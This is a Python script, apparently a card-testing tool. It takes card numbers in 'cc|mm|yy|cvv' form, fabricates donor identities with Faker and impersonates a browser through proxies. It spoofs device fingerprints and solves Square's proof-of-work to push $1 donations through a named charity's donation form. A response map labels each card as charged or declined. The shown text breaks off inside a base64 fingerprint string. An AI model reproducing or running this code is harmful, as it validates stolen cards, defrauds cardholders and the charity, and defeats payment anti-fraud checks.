import re
import json
import asyncio
import hashlib
import uuid
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""

        mm = mm.zfill(2)

        # تحويل السنة إلى 4 أرقام كما في الأصل
        if len(yy) == 2:
            yy = "20" + yy
        # إذا كانت 4 أرقام تبقى كما هي

        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")


RESPONSE_MAP = {
    '"status":"completed"': ("Success", "Charged - Approved ✅", True),
    '"status":"approved"': ("Success", "Charged - Approved ✅", True),
    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
    "card_declined": ("Declined", "Card Declined ❌", False),
    "generic_decline": ("Declined", "Generic Decline ❌", False),
    "expired_card": ("Declined", "Expired Card ❌", False),
    "invalid_card_data": ("Declined", "Invalid Card Data ❌", False),
    "invalid_card": ("Declined", "Invalid Card Data ❌", False),
    "card_token_expired": ("Declined", "Card Token Expired ❌", False),
    "card_type_not_accepted": ("Declined", "Card Type Not Accepted ❌", False),
    "cvv_failure": ("Declined", "CVV Failure ❌", False),
    "address_verification_failure": ("Declined", "AVS Mismatch ❌", False),
    "card_declined_verification_required": ("Declined", "Verification Required (3DS) ❌", False),
    "voice_failure": ("Declined", "Voice Auth Required ❌", False),
    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
    "amount_too_high": ("Declined", "Amount Too High ❌", False),
    "transaction_limit": ("Declined", "Transaction Limit Exceeded ❌", False),
    "idempotency_key_reused": ("Declined", "Duplicate Transaction ❌", False),
    "unauthorized": ("Declined", "API Unauthorized ❌", False),
    "access_token_expired": ("Declined", "API Token Error ❌", False),
    "access_token_revoked": ("Declined", "API Token Error ❌", False),
    "bad_request": ("Declined", "Invalid Request ❌", False),
    "not_found": ("Declined", "Resource Not Found ❌", False),
}


class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        sess = str(uuid.uuid4())

        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=150) as session:
            try:
                # Step 1: GET donation page with iframe param
                headers_get = {
                    "referer": "https://chrysaliscenterct.org/give/make-a-gift/",
                }
                params_get = {"giveDonationFormInIframe": "1"}
                resp_get = await session.get(
                    "https://chrysaliscenterct.org/donation/7255",
                    params=params_get,
                    headers=headers_get,
                )
                html = resp_get.text
                ap = tools.find_between(html, '"applicationID":"', '"')
                lo = tools.find_between(html, '"locationID":"', '"')
                hash_val = tools.find_between(html, 'name="give-form-hash" value="', '"')
                pre = tools.find_between(html, 'name="give-form-id-prefix" value="', '"')
                give = tools.find_between(html, 'name="give-form-id" value="', '"')
                if not ap or not lo or not hash_val or not pre or not give:
                    return "Error", "Missing page parameters", False

                # Step 2: POST to admin-ajax (give_process_donation) first call
                headers_ajax1 = {
                    "origin": "https://chrysaliscenterct.org",
                    "referer": "https://chrysaliscenterct.org/donation/7255?giveDonationFormInIframe=1",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                }
                data_ajax1 = {
                    "give-fee-amount": "0.34",
                    "give-fee-mode-enable": "false",
                    "give-fee-status": "enabled",
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Donation",
                    "give-current-url": "https://chrysaliscenterct.org/give/make-a-gift/",
                    "give-form-url": "https://chrysaliscenterct.org/donation/7255/",
                    "give-form-minimum": "1",
                    "give-form-maximum": "10000",
                    "give-form-hash": hash_val,
                    "give-price-id": "custom",
                    "give-amount": "1",
                    "give-fee-recovery-settings": '{"fee_data":{"all_gateways":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}',
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "give_comment": "",
                    "payment-mode": "square",
                    "billing_country": "US",
                    "card_address": user_data["address"],
                    "card_address_2": "",
                    "card_city": user_data["city"],
                    "card_state": user_data["state"],
                    "card_zip": user_data["zip"],
                    "card_nonce": "",
                    "give_action": "purchase",
                    "give-gateway": "square",
                    "give_embed_form": "1",
                    "action": "give_process_donation",
                    "give_ajax": "true",
                }
                await session.post(
                    "https://chrysaliscenterct.org/wp-admin/admin-ajax.php",
                    headers=headers_ajax1,
                    data=data_ajax1,
                )

                # Step 3: Square hydration
                # تم حذف هيدر content-type لأنه غير موجود في الأصل
                headers_hydrate = {
                    "origin": "https://web.squarecdn.com",
                    "referer": "https://web.squarecdn.com/",
                }
                params_hydrate = {
                    "applicationId": ap,
                    "hostname": "chrysaliscenterct.org",
                    "locationId": lo,
                    "version": "1.83.0",
                }
                resp_hydrate = await session.get(
                    "https://pci-connect.squareup.com/payments/hydrate",
                    params=params_hydrate,
                    headers=headers_hydrate,
                )
                hydrate_json = resp_hydrate.json()
                inn = hydrate_json.get("instanceId")
                se = hydrate_json.get("sessionId")
                if not inn or not se:
                    return "Error", "Hydration failed", False

                # Step 4: Proof of work
                def compute_hash(input_str):
                    return hashlib.sha256(input_str.encode()).hexdigest()

                def proof_of_work(e, t, r):
                    n = 0
                    target_prefix = t
                    while True:
                        combined = f"{e}:{n}:{','.join(r)}"
                        hash_result = compute_hash(combined)
                        if hash_result.startswith(target_prefix):
                            return n
                        n += 1

                var = proof_of_work(se.strip(), "000", [ap.strip(), lo.strip(), inn.strip()])

                # Step 5: Get card nonce
                headers_nonce = {
                    "origin": "https://web.squarecdn.com",
                    "referer": "https://web.squarecdn.com/",
                    "content-type": "application/json; charset=utf-8",
                }
                params_nonce = {
                    "_": "1774672911370.7332",
                    "version": "1.83.0",
                }
                json_nonce = {
                    "analytics": {
                        "fingerprints": [
                            {
                                "components": '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36","language":"ar","resolution":[813,370],"available_resolution":[813,370],"timezone_offset":-180,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
                                "fingerprint": "5a8050d78ec1afbdcc9957bcf1244bdc",
                                "version": "fingerprint-v1",
                            },
                            {
                                "components": '{"language":"ar","resolution":[813,370],"available_resolution":[813,370],"timezone_offset":-180,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
                                "fingerprint": "9cbe639ccc618b7ee0ba7aca96b89957",
                                "version": "fingerprint-v1-sans-ua",
                            },
                            {
                                "components": '{"fonts":["sans-serif-thin"],"dom_blockers":[],"font_preferences":{"default":167,"apple":167,"serif":167,"sans":156,"mono":136,"min":15,"system":156},"audio":124.08072766105033,"screen_frame":[0,0,0,0],"languages":[["ar"]],"device_memory":8,"screen_resolution":[813,370],"hardware_concurrency":8,"timezone":"Asia/Baghdad","indexed_db":true,"open_database":true,"platform":"Linux armv81","plugins":[],"canvas":{"winding":true,"geometry":"data:image/png;base64,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","text":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAAA8CAYAAABYfzddAAAAAXNSR0IArs4c6QAAH9tJREFUeF7tnQl4HNWV73+3etO+e5FteRO2wSDvLC8kATJJJpNkQjKJMxMSwCCp25hAhiyTBQJiy2MCCRMIttSSDSQv8AaSmYQJb+bLBkkIq21sjMHYeEGWLe+yLWvrpe77TnWXVGp1txbLCjZ9v8+f7eqqu5y6/3vO+Z9zbykyJSOBjAROWwmo07bnZ2jHtR99hg4t7bBUkMxcHMGLzwhtBEI7lY+cKQDWWR7MPC9mYRa4FOpECNURxujoQUXMASLMAHhksyoD4JHJ7ZQ9dboDOFKWR2TBBJiYhXIpMOKiMkFHNbrDxLXxIN4dh/rJMAPgkU2p0xPA/oYrUPoGtPIAOcCvgM8yqfVs6uoGLu8jk03sKX+DH/hXoAh3pJyV1+/D33AjcBeQj2lU0FTbcjJNOJ9NBuAH+BC3cDntZLGbbzGFtlFp7k4+wb18dNTqDU0rwby4HOVVKI9CuQGlsIxjU6OjoMMaHdKw8QhZb+yzrkvJAHhkr3QggP0NZwPfAaYAPqAAaCAY+PHImhjlp1Y8VEHEvQutPkBj7QsEGr6P1rvRrg/R6P/0KLcWq642+BmU/o9eAMeufRalfz4WAJbmfsEiPkdgVAE8mvWGywuIXlKBylYYPhUDsTuugWWWCXgjOgbgHo3Zo1EvHcD39sEMgE9i0vYHsL9hEfBrtPocjf7n45O3FqWDuCNTWXn97pNoa3Qe9TdcBvxhtIGTtnO1wQ+j9G8TABy7NgYaWPr2O87hI/zzqAN4NOrVboPuy2ZiTMrCyFYc6TS55weHWVZdSNV52ZZoT5yIctutB7nmygLOme7D7NaYh0P4frsToyuc0cAjREd/AAfqX0CrXxMM3N1b3w0PFBDyfoqGwM/wBzcD5wBdwB0EA/ewfNVkTKMFw5xB/XW7qA1eidIrLe2t1TdQei+wGohgGpej9NdQegbiHSn9z5hGESDPTAc60Op6Gv0bko4nUP9VtPoSsBB4DujGMAVEtwK5/cDkbygDfgjMQCuF0i/i67mZB2/swd9QA/wbsAOtvorSYhJ/EPgmwUADgfq5aPVjtMqN9/8Z4EdJAQyfAa622oHNuKJfZtWKmI3rb6hCqwdQuhCtjmGYLkzjW72LY18/QrZsFqrmy32EeYjHWURzrxicQCvnGLO5gx2MYxztPMe9zGZ/UpG9yEy+yT9govAQpYI2XmQG9/Fz/p7XBiwMF/JtXmY6Bpof8iRf4ffUcBWruZgiOvk99/frlzQamVhA5G8qMLINC8C//Us79z14iMs/WcCXrxtn9eullzu45fZ9XPH5Iq7+bDFml8bsMuFPzWQ1t2cAfNIA9jdMBd4BPkAwIOAYWJY9nIU3tA2ln6Jh+fVxDb0CpX+M0l+hYfmD8Yn7LctoCgbujf9/KfAE8H2CgW/Gn1uF0lcB9xAM3AlaUdu4EqUvJhiYl3I8tjZ0ar7a4D+h9OP9AFwbFNBtp9Ffw9InvBQd/QNK/5Fg4Gar7kD9P6LV48D3CAZuIVD/EKbxCo21j+IPbpQ5RzBQS2zMvwfelxTASt9Hw/JvUFfnZm/5b4CdBAPV8XHfjFaXMHnvxyzfPFAvfvu3CQYm9Y4v1o//a8tGfOAVXMFznMVr3JEUwOID/4CPWPf8lDXk0ZNUXF14qORuC4j/xCvczKfZRSnX8UciGFzK1gEADuHmHOpYQAu/oL633oXcwt38ko/z+oC2euaMhwvGoXIMjByD3z7Xzn3/dpCP/20+N9043rr/+Rc7uO3OfXz+s0VUX1GC7jQtEEfW7iF3c1sGwKMA4PcDf8YVPZtVK95KWZ+/4UeAgGxJHIi/QemdwFyCgQ/Erz2KK3qbpZGl2KCDeQQDm+LXPonS/0XUNYvVNW/3uxZxF7Cmuj1pH5IDuL85W900DVdU2u5bjGJk1F0E/RNA6d4+KX0JDcv/1NvW8lXTMY2dmMYHaar9cxyIAaA+hQa+iGDgpfh9otnvZ1JrYYxM04pljxTyyDVH44vGR9DqN3jCZTz05cPJZCMA/jXz+Huu5zhfIZ9u6zanBn6bcdzL31oAyyKc8lWtZyqLuZmdfIfpHEbq/QeW08ENljZOrNcmx+7nw3yfj9LMt637ZCGYx61s4TZcDOQIu6smoRaWYOQoC8CHT0T5wtXv8L07yjl/sXCMMRNart3+3YksnJuNKQDu1EQ3HSBn3YEMgEcNwFrNodG/NWV9gfqPodV/W5PZNMQkvA94yAK/YU7hcOlBitt+SzBwSW8d6UBnM7tOoDuvJXZkKACuafwAhvknXNFKVq3YEQfXJyz/3hUtsUxcu56oazqra8TyiJVA/f9CK/H/zyIY2N5vYUnWV9OYSVOtLGBiMsfaiLpKWV1zhED9LOB6tBKLQhBTDCxO50sLgG2wtvINJnK8H9Ce4iG+SDWP8gif4dW0r/15KrmYf+kF8FPM53JWWADOIZQSwAfJZwr38CRBPsVGnqaKZ5hjmd3JSs85E+H8MgvAu1smUTrtGPmFsYUnsXS2ezmwo5iKaXstAEc27CN3w6EMgE8awLbm0epSGv1/TFmfv0GW1ENotQylS1F6P0dKfkVxmzhsYvMJ+N/Xz48eawAvX3UBpiFacSAIEwGcSEIF6j+IVjL+vmdtYCYDsHORqA3GrAp3JJ+I2wWIJfMr3JGvsfL6E72LRvKFwApHDQbgK3kRL1H+m3PZxB2U0JHyVXXiZSZ3cw//yTKe5yY+zyYm8zvu730mFYl1NdfQRg6yYFzD1SznT1xIbJ1KLKEZpZjvn0hLa4R1rZ/kQx/5G8In9hEK9e+bx5XFiZDBi2s3c8HEp5k5zUP4lWby3jyeAfBJAzimQYQ8+h3BwNfT1udv+E+02o3SFXRlf4mfXtWBX8I56lyUft3yLZ1E1FgDuKZxAoa5L4kJ/b8J+sv6mdCJAK4NzkZpAV6f+V0btJn4WBxYij0mrS52kFKxmHEwUExN40UY5gv9XJJA/efQ6smT0cASBxafdy51XMZb/MziB1MX0brXchXz2MMMDnEXv0JIMLukAvBfqOSDfIPt3MxnuI713I1KkeUZLc4h/NHpGHkG3/nhfl59vZt5Sy5m/MTJlIybaDW1dfMGtm5eT2fHCWZX+vjRLeWY7SHMF5rJae7KAHhUAFwbvMTSIPAFgoGnrTpjJM7twO0EA53WtRh7+g2LCe4jbC4ERHP9kaD/YxZI7FIb/DxK/zuGWUX9dTEWxAaA0ufSsPyNfteE6Q4GtiQdUx9hNZ+m2tf6PecEo7/hFyh9nIbl1+BvkISPPwAvEAz8S/yZGPGl1Xk0+oVdjxet8AdfR+lnLaJOCLDitv8AxDzu65c9Jq3qafRfZ5FYrRMlvLXVIs78DeVAM0p/jIblv2fFQ3lE3A3AFQmWQawfcdk4NfCb3MbZxNaLJ1jCP1LLZuqYSyu/ZIEFLGGrV/BsytcvGvgF/pUJcVM88Ua73k3cznlIwKCvzOe7VvvnsI86ZFqkKAq6L5iGmpNPW7fJd+7dxzstMd+8PLcAt+Fid3uMmJ8wzs0935rAhHw33ZtbKNx4HMJmBsCppZv2l4GJHKI5lP4uSou/Jku1hHvW0LD833trshlrrS6n0f+Udb2uzmBvufibP++nwf0NNwG3AYXAASt01LD8cQextR+la2lY/l+OaxKW+hT11/V38vwNdcDXgDyw4ia/Jxj4Yu9zTgBXN5XgikqoqFLygIA/4eu5wwojBeqr0Up+k3pagYd72WkZS3XTWbiiQsHK7wLCNZbfL/cqHUArCRndBfooqBqUlvDWRMv6MMwbesNIgfovWawzFjJ2YBp3YpjvgN4Fqko87rjbERuP0rVaL3/K1opCKokJ+2dm9WZiifZ8nCYuYSt383F+yIe5gpd5ECGyB5ZqrmIDFZap7cZkFge4id9Z2tiZiSX12my1XUsDH2Q5XyQZuBNbihZkEbpsOkaRmy6t+cMfe6hoXURlboxw39m5j23jXuEjl/jI8xiE9xzB/foRslpjvnImE2tkCD49UykTxxqoj7G7MIlgQAB52pbRyoWOYiDgFQ0qgPURoQc3t/NJfs5i3uLWlCaxLTwJU13PF9jInUOSZ6Qkm54FZbgnF2IlubqVlUkpqZRallDJhQ5put/Zj7u5g9xdkk4QKxkAD0nEA246MwAcM2cfJ7cjj/u/2jcrRiaTv+pTowXgdUxjCd/hbW6hkli6ohTb9D7BjeSmiB/b9y5jGUt4hy8jIfWhlWiOh86pWTA+C6MoF1d+DsploEMRooeOY7YcI3tPD+72SL8KMwAemnwT7zr9ASyme+tEyUmO0uiXhJHTuowWgPdQxAy+x2p+gjDXUmQzhISgTuDjD1aSWvKiUTzEpXyPv7M0tR2LHq5gI7kuTI+Q8cKIaDzHUsesMwAernRj95/eAI4RbJKE0UzEfSNrqvuzMCOTyV/1qdECsAzifziXu/gEBqYVejpOlpV99S3+J2X4STS0hJtEa9/PE1SxZ0zkkQHwyMR8egN4ZGN+Vz81mgB+Vw80oXMZAI/sbWUAPDK5nbKnMgA+ZaI9IyvOAPiMfK2ZQb1XJJAB8HvlTWfGeUZKIAPgM/K1Zgb1XpFABsDvlTedGedpKQH9BK62tpl5xeOUr8vAZ6gsn5xHpMPecJTOUAbAp+VrzXT6TJeA/sm83PasnimuHJVHjgcks43YX85o+pAAfOVGcl0m41wGeWYYr6HReAkr6IiYtD2ykNiG9TO0+NdSFjYYbxjIaTcoLweb5tPiX0tlOILv4Qt5c9C8xDGSTc06FktT+eN54/4K6+gjq6S6PkbdGnYz75b+jnU/9DOXurv37Zpi5meVUuiJ4TYO3mRCTA9gjfKvo8JUxA42kp0NbrQZGZAA0hkpYecjM+LHRwz7db17H7juNYrDYWY6x29o9tcvYM81a1kkZ5ZnF/D6g7MGyUscoyFmADy6gh5LALc9PL3I41NTVanP43Fo3REDWDSMqSgSjRtyccQb5UBwcWxVv+kFsg5Dic/NOO3CpVx0Ny7AsS1vdAX516qtZp11iF+O6aFtahW76hRmncaQv2teYoZp4F1zvrVx/11RMgAe3dcwVgDe95MJuXmuglmq3OXyeOIms615nRrY/nfcjk6pgZe9zES3i8mygSTLy85V85KfJu5fiyeqmObS7A0uIbZf+Awq1a+wUBkYZhdb17yf5Od0vYvGmwHw6L6MsQCwEFUdHTPnqkleb6/mFaAmAjjRlBZ3Ltlwlz6Bq2gWVdrEZSpa1yxK2Ok9ujJ6V9dmv0BD8+bpsEBlADy602ksANz56OzJusCYSJkHUb4WcD1wrBO+fmsrixZ5uLGmfKAvnArAyzcyPhKhQgivpkVsGg5B88UXKcj2MEtF6W68YKBJfc3LVLhcjDc0oeASYidUOop/LeWmYpJz4XAKse1ttLuEciLki+luhAi5fBysn88Bu5rr/kxxTxbjXZpsU1mf6OnqjnLwJxcSOwlyCMVuM9mtTYtZJ9fTvdy6Oox9n6EsEqFURfFJP9wuesJwtH0h+59U8WMhHQ0462uZQijvFSZ5DIrw4AmZ7LDIQo265lXKPCal2kWWPC6yjmZzYPW5HBkKgCPdmOETlEdMCqIat4awF461ZbPvyXPjp90lDHzpZryF7YxXWRRaRKYbLe3K+WjBJfT/0FH8WWdfOvYj+wfl3RZZ7w1CKsKR4GL2JZtf6WRru3YuRSSnm633v6+PrEv1asXtOfAG48MdlJoKr5bjNaO0F4ZplZnefoC58qz9bu16EvvhX8tU4YRMk7Y15xM7MHHgHC4zFdOUi/bGBdYZcSmLrsPoqJxdpSb73BZ45cS5OIBXNR3iULOH57YcY+WPyjm7MnbCp13Wb+pMroGr13GWgsKIweFHFhI7GnaoRaOq17JAzE5D81pwSf9zT22fUqqLlLA5kfgKvMqsqElBj5stP50fO7HNFqLbze5wiMlSd2J3vF4OrKxid/V6pimNHOo+gHAzNAeDSxynpacZk5jO8rPdlvXC437H6vNjx0GmmmR1GnfLeuREyv4Sj7enTXqiJ3j7kcv6k352fWYuW13HmWoDVMDiy2HzphaiM/OoNAzrpJABRSsO2WNPxUL3dLM7K4dJYl0lqSJsaN5OtDSEhdcuptjPJBKZqSazPR6dxU7VbX2qZwCfapqcWLOErYkgTiXbZa8y3W1Sqgyi3Qbb7DmSbnrWPYO7pSD5+9Ampi+H1lA3k6WOwQC84hnyQgXMkecqnmZjXd3Ac3Zt/Biad1ItbnZ/hbjyFmVVJmpfkdSKr7eyvTk26WquLuSKpda07i2PPXkoOYCXraXKrfCGIuwajtaya172IrPcHgoSn7/0GdyzS5gXDse+OImXlqaq/p8UqH2VBQKUxgvo/TqDw4zVEYNoJEzLzAtoe/ZZjNn5jMNDucWMRziCm5KooisUouVnF9K+9A08pSEmRUxKLVDHJmjfqW6DLEzpNEGq32pfYrZ2ky8aQpvsmbSYI9wOuy6nQD6OILK1SL/5vOGcuA6t32lo5JskrVvbOfjspUTlPntiJNa7eylFiQBJBWAhJGUx6u5kb+X7Yppzx8sU+xQVvWSko18rNpMX6maOtZhFaPfksXflXDqWglG6kYmRKNapdVFF88OLHCcHOBY4AZvc4zLYe/gtDrMUitcxXiwtue7NYs/Kc+OHf8XfRzLZ2tZbHHTbVp7LiUFen/WzrRRUlKgyaLHeh5xztI4SbTJF+TDsyMpgAJbnql/hPGXg0z3sXP2+WF12EU2/eyPzZQ5XLGGjkJ3p+